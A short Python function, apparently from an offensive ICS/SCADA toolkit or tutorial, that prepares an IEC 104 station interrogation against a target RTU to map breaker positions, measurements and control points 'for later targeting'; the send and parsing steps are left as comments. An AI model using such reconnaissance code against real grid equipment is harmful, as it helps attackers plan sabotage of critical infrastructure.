def iec104_interrogation(target_rtu):
    """
    Send IEC 104 Interrogation Command
    Equivalent to "read all data"
    Maps entire RTU configuration
    """
    attacker = IEC104Attack(target_rtu)
    attacker.connect()

    # Type 100: Interrogation command
    type_id = 100
    vsq = 0x01
    cot = 0x06  # Activation
    oa = 0x01
    ca = struct.pack('<H', 1)

    # Qualifier of Interrogation (QOI)
    # 20 = Station interrogation (all data)
    qoi = b'\x14'

    # Build and send interrogation
    # Response will contain all points in RTU

    print(f"[*] Interrogating {target_rtu}")
    print("[*] Response will contain:")
    print("    - All binary inputs (breaker positions)")
    print("    - All analog values (voltage, current, power)")
    print("    - All control points")

    # Parse response to build RTU map
    # Store for later targeting

    attacker.close()
